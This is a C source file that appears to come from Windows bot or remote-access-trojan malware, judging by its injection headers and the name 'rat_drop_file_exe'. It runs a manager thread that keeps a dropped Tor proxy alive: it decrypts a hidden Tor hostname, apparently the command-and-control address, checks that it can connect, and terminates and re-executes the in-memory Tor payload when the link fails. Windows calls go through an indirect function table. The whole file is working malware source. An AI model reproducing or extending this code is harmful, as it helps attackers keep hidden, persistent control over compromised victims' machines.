#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdlib.h>

#include "bot.h"
#include "connection.h"

#include "functions_table.h"

#include "process_injections.h"

#include "global_config.h"
#include "debug.h"

#include "crypto.h"

#include "tor_executor.h"

#include "manager.h"

//
DWORD MANAGER_TOR_PROCESS_ID = 0;

//
HANDLE t_tor_manager_thread = NULL;
DWORD t_tor_manager_thread_id = 0;


//
static bool restart_tor_proxy(PVOID tor_payload_address, DWORD tor_payload_len)
{
	if (MANAGER_TOR_PROCESS_ID != 0)
	{
		HANDLE targetProcess = l_OpenProcess(PROCESS_ALL_ACCESS, FALSE, MANAGER_TOR_PROCESS_ID);

		if (targetProcess == NULL) {
			DBG_MSG("restart_tor_proxy() - OpenProcess(PROCESS_ALL_ACCESS) failed, error code: %d. pid: %d \n", l_GetLastError(), MANAGER_TOR_PROCESS_ID);

			return false;
		}

		//
		DWORD process_exit_code = 0;

		bool get_process_exit_code = l_GetExitCodeProcess(targetProcess, &process_exit_code);

		if (!get_process_exit_code) {
			DBG_MSG("restart_tor_proxy() - GetExitCodeProcess() failed, error code: %d. pid: %d. Nothing to be done, we create new TOR process now. \n", l_GetLastError(), MANAGER_TOR_PROCESS_ID);

			//
			MANAGER_TOR_PROCESS_ID = 0;
			goto CREATE_NEW_TOR_PROCESS;
		}

		//
		if (process_exit_code == STILL_ACTIVE) {
			DBG_MSG("restart_tor_proxy() - process is STILL_ACTIVE. pid: %d. We must kill it.\n", MANAGER_TOR_PROCESS_ID);

			bool ret_term = l_TerminateProcess(targetProcess, 0);

			if (!ret_term) {
				DBG_MSG("restart_tor_proxy() - TerminateProcess failed, error code: %d. pid: %d \n", l_GetLastError(), MANAGER_TOR_PROCESS_ID);
				return false;
			}
			else {
				//
				DBG_MSG("restart_tor_proxy() - TerminateProcess SUCCESS.\n");
				MANAGER_TOR_PROCESS_ID = 0;
				goto CREATE_NEW_TOR_PROCESS;
			}
		}
		else {
			DBG_MSG("restart_tor_proxy() - process is NOT STILL_ACTIVE. pid: %d. Nothing to be done, we create new TOR process now.\n", MANAGER_TOR_PROCESS_ID);

			//
			MANAGER_TOR_PROCESS_ID = 0;
			goto CREATE_NEW_TOR_PROCESS;
		}



	}

CREATE_NEW_TOR_PROCESS:
	char* rat_drop_file_exe = execute_payload((char*)tor_payload_address, tor_payload_len, &MANAGER_TOR_PROCESS_ID);


	DBG_MSG("restart_tor_proxy() - TOR_PROCESS_ID: %d \n", MANAGER_TOR_PROCESS_ID);

	//
	free(rat_drop_file_exe);
	return true;
}

// no need to sleep to much due to waiting of recv() set on  connection_tor::init_tor_socket
#define TOR_MANAGER_THREAD_INTERVAL 5000
static DWORD WINAPI tor_manager_thread(LPVOID manager_injection_entry_point_params_p)
{
	MANAGER_INJECTION_ENTRY_POINT_PARAMS* manager_injection_entry_point_params = (MANAGER_INJECTION_ENTRY_POINT_PARAMS*)manager_injection_entry_point_params_p;

	DBG_MSG("tor_manager_thread() - manager_injection_entry_point_params->tor_payload_address: 0x%p \n", manager_injection_entry_point_params->tor_payload_address);
	DBG_MSG("tor_manager_thread() - manager_injection_entry_point_params->tor_payload_len: %d \n", manager_injection_entry_point_params->tor_payload_len);

	// 1st time.
	restart_tor_proxy(manager_injection_entry_point_params->tor_payload_address, manager_injection_entry_point_params->tor_payload_len);


	//
OUTER_LOOP:
	while (1) {
		l_Sleep(TOR_MANAGER_THREAD_INTERVAL);

		DBG_MSG("tor_manager_thread: new iteration comes\n");

		int counter = 0;

		while (counter < 5)
		{
			SOCKET socket = NULL;

			//
			bool ret_init_socket = init_socket(&socket);

			if (!ret_init_socket) {
				DBG_MSG("tor_manager_thread: failed - init_socket() failed - increase the counter thereafer and sleep a bit. counter: %d \n", counter);
				counter++;
				l_Sleep(6000);
				continue;
			}

			//
			char* tor_hostname = NULL;
			decrypt_to_string(&tor_hostname, TOR_HOSTNAME, TOR_HOSTNAME_ENCRYPTED_LEN);

			DBG_MSG("tor_manager_thread: tor_hostname: %s\n", tor_hostname);

			//
			bool ret = connection_tor::init_tor_socket(tor_hostname, &socket);
			free(tor_hostname);

			if (!ret) {
				DBG_MSG("tor_manager_thread: - FAILED to init tor socket - increase the counter thereafer and sleep a bit. counter: %d \n", counter);
				counter++;

				// no needed to sleep due to waiting of recv() set on  connection_tor::init_tor_socket
				// l_Sleep(6000);
				continue;
			}
			else
			{
				DBG_MSG("tor_manager_thread: - SUCCEED to init tor socket. TOR is working, no need to restart. counter: %d \n", counter);
				goto OUTER_LOOP;
			}


		}


		//
		DBG_MSG("tor_manager_thread: TOR needed restart, RESTART TOR now.\n");
		DBG_MSG("tor_manager_thread() - manager_injection_entry_point_params->tor_payload_address: 0x%p \n", manager_injection_entry_point_params->tor_payload_address);
		DBG_MSG("tor_manager_thread() - manager_injection_entry_point_params->tor_payload_len: %d \n", manager_injection_entry_point_params->tor_payload_len);

		restart_tor_proxy(manager_injection_entry_point_params->tor_payload_address, manager_injection_entry_point_params->tor_payload_len);
	}


	return 0;
}

//
bool manager_init_tor_manager_thread(MANAGER_INJECTION_ENTRY_POINT_PARAMS * manager_injection_entry_point_params)
{
	//
	DBG_MSG("manager_init_tor_manager_thread() - manager_thread_params->tor_payload_address: 0x%p \n", manager_injection_entry_point_params->tor_payload_address);
	DBG_MSG("manager_init_tor_manager_thread() - manager_thread_params->tor_payload_len: %d \n", manager_injection_entry_point_params->tor_payload_len);


	//
	t_tor_manager_thread = l_CreateThread(
		NULL,
		0,
		tor_manager_thread,
		(LPVOID)manager_injection_entry_point_params,
		0,
		&t_tor_manager_thread_id
	);

	if (t_tor_manager_thread == NULL) {
		DBG_MSG("manager_init_tor_manager_thread() - l_CreateThread() failed, error code: %d\n", l_GetLastError());


		return false;
	}

	//
	DBG_MSG("manager_init_tor_manager_thread() - SUCCESS.\n");

	//

	return true;
}
